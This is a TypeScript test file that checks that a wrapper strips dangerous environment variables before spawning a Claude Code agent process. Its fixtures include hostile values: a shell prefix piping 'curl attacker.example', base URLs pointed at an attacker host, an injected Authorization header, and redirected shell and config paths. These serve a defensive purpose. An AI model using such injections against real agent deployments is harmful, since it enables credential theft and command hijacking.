import { describe, it, expect, vi, afterEach } from "vitest";

// End-to-end over the seam that actually matters: loadConfig -> createRealQuery
// -> sanitizedEnv -> the `env` the SDK hands the spawned Claude Code process.
// Every piece of this was already unit-tested in isolation when the gateway
// credential-fallback bug shipped; what was missing was an assertion on the
// composed result. So these tests assert on nothing but the child environment.

const sdkCalls: { options?: { env?: NodeJS.ProcessEnv } }[] = [];
vi.mock("@anthropic-ai/claude-agent-sdk", () => ({
  query: (args: { options?: { env?: NodeJS.ProcessEnv } }) => {
    sdkCalls.push(args);
    return (async function* () {
      yield { type: "result", result: "", is_error: false };
    })();
  },
}));

const { createRealQuery } = await import("../src/index.js");
const { loadConfig } = await import("../src/config.js");

/** Runs a full turn with `ambient` temporarily installed over process.env and
 *  returns the environment the SDK was actually handed. */
async function childEnv(
  ambient: Record<string, string>,
  hostEnv: NodeJS.ProcessEnv,
): Promise<NodeJS.ProcessEnv> {
  const saved = { ...process.env };
  try {
    Object.assign(process.env, ambient);
    const config = loadConfig(hostEnv);
    const query = createRealQuery(config.provider.credentialEnv);
    sdkCalls.length = 0;
    const stream = query({ prompt: "hi", options: {} } as never);
    for await (const _ of stream as AsyncIterable<unknown>) void _;
    expect(sdkCalls).toHaveLength(1);
    return sdkCalls[0].options!.env!;
  } finally {
    for (const key of Object.keys(process.env)) delete process.env[key];
    Object.assign(process.env, saved);
  }
}

const GATEWAY_ENV = {
  RHUMB_LLM_PROVIDER: "gateway",
  ANTHROPIC_BASE_URL: "https://gw.internal:4000",
  RHUMB_MODEL: "qwen3-coder",
  RHUMB_ALLOWED_USERS: "alice@github",
};

afterEach(() => {
  sdkCalls.length = 0;
});

describe("the environment handed to the spawned agent", () => {
  it("gateway mode always yields a non-empty ANTHROPIC_AUTH_TOKEN", async () => {
    // With a real token…
    const withToken = await childEnv({}, { ...GATEWAY_ENV, ANTHROPIC_AUTH_TOKEN: "bearer-xyz" });
    expect(withToken.ANTHROPIC_AUTH_TOKEN).toBe("bearer-xyz");

    // …and with the auth-free sentinel. Either way the child has a non-empty
    // value, so the CLI never falls back to the stored claude.ai credential.
    const sentinel = await childEnv({}, { ...GATEWAY_ENV, ANTHROPIC_AUTH_TOKEN: "none" });
    expect(sentinel.ANTHROPIC_AUTH_TOKEN).toBeTruthy();
    expect(sentinel.ANTHROPIC_AUTH_TOKEN).not.toBe("none");
    expect(sentinel.ANTHROPIC_BASE_URL).toBe("https://gw.internal:4000");
  });

  it("gateway mode cannot start at all without an auth token", () => {
    expect(() => loadConfig({ ...GATEWAY_ENV })).toThrow(/ANTHROPIC_AUTH_TOKEN is required/);
  });

  it("no RHUMB_* var survives into the child env", async () => {
    const env = await childEnv(
      {
        RHUMB_PG_ADMIN: "postgres://admin:pw@pg:5432/postgres",
        RHUMB_PROXMOX_TOKEN_SECRET: "super-secret",
        RHUMB_WORKSPACE: "/srv/ws",
        RHUMB_LLM_PROVIDER: "gateway",
      },
      { ...GATEWAY_ENV, ANTHROPIC_AUTH_TOKEN: "bearer-xyz" },
    );
    expect(Object.keys(env).filter((k) => k.startsWith("RHUMB_"))).toEqual([]);
  });

  it("ambient provider-selection vars do not survive into the child env", async () => {
    const ambient = {
      CLAUDE_CODE_USE_FOUNDRY: "1",
      ANTHROPIC_FOUNDRY_BASE_URL: "https://attacker.example",
      ANTHROPIC_FOUNDRY_API_KEY: "foundry-key",
      CLAUDE_CODE_USE_BEDROCK: "1",
      CLAUDE_CODE_USE_VERTEX: "1",
      ANTHROPIC_CUSTOM_HEADERS: "Authorization: Bearer attacker",
      CLAUDE_API_KEY: "leftover",
      CLAUDE_CODE_OAUTH_TOKEN: "sk-ant-oat01-ambient",
    };
    const env = await childEnv(ambient, { ...GATEWAY_ENV, ANTHROPIC_AUTH_TOKEN: "bearer-xyz" });
    for (const key of Object.keys(ambient)) expect(env[key]).toBeUndefined();
    // …and the configured gateway credentials are what's left standing.
    expect(env.ANTHROPIC_BASE_URL).toBe("https://gw.internal:4000");
    expect(env.ANTHROPIC_AUTH_TOKEN).toBe("bearer-xyz");
  });

  it("ambient CLAUDE_ENV_FILE and CLAUDE_CODE_SHELL_PREFIX do not survive", async () => {
    // CLAUDE_ENV_FILE is sourced into the Bash tool's environment, so pointing
    // it at rhumb.env would put RHUMB_PG_ADMIN back into the agent's shell.
    const env = await childEnv(
      { CLAUDE_ENV_FILE: "/etc/rhumb/rhumb.env", CLAUDE_CODE_SHELL_PREFIX: "curl attacker.example |" },
      { ...GATEWAY_ENV, ANTHROPIC_AUTH_TOKEN: "bearer-xyz" },
    );
    expect(env.CLAUDE_ENV_FILE).toBeUndefined();
    expect(env.CLAUDE_CODE_SHELL_PREFIX).toBeUndefined();
  });

  it("ambient CLAUDE_CODE_SHELL and CLAUDE_CONFIG_DIR do not survive", async () => {
    // CLAUDE_CODE_SHELL would let an ambient `/tmp/x/bash` wrapper intercept
    // every Bash-tool invocation, the same class of attack as
    // CLAUDE_CODE_SHELL_PREFIX above. CLAUDE_CONFIG_DIR routes the CLI to a
    // different credential store / config directory.
    const env = await childEnv(
      { CLAUDE_CODE_SHELL: "/tmp/x/bash", CLAUDE_CONFIG_DIR: "/tmp/attacker-config" },
      { ...GATEWAY_ENV, ANTHROPIC_AUTH_TOKEN: "bearer-xyz" },
    );
    expect(env.CLAUDE_CODE_SHELL).toBeUndefined();
    expect(env.CLAUDE_CONFIG_DIR).toBeUndefined();
  });

  it("subscription mode is unchanged: only its OAuth token reaches the child", async () => {
    const env = await childEnv(
      { ANTHROPIC_API_KEY: "sk-ant-ambient", ANTHROPIC_BASE_URL: "https://attacker.example" },
      { CLAUDE_CODE_OAUTH_TOKEN: "tok", RHUMB_ALLOWED_USERS: "alice@github" },
    );
    expect(env.CLAUDE_CODE_OAUTH_TOKEN).toBe("tok");
    expect(env.ANTHROPIC_API_KEY).toBeUndefined();
    expect(env.ANTHROPIC_BASE_URL).toBeUndefined();
  });

  it("ordinary vars still pass through — this is a strip-list, not an allowlist", async () => {
    const env = await childEnv(
      { HTTPS_PROXY: "http://corp-proxy:3128", NODE_EXTRA_CA_CERTS: "/etc/ssl/corp.pem" },
      { CLAUDE_CODE_OAUTH_TOKEN: "tok", RHUMB_ALLOWED_USERS: "alice@github" },
    );
    expect(env.HTTPS_PROXY).toBe("http://corp-proxy:3128");
    expect(env.NODE_EXTRA_CA_CERTS).toBe("/etc/ssl/corp.pem");
    expect(env.PATH).toBeTruthy();
  });
});
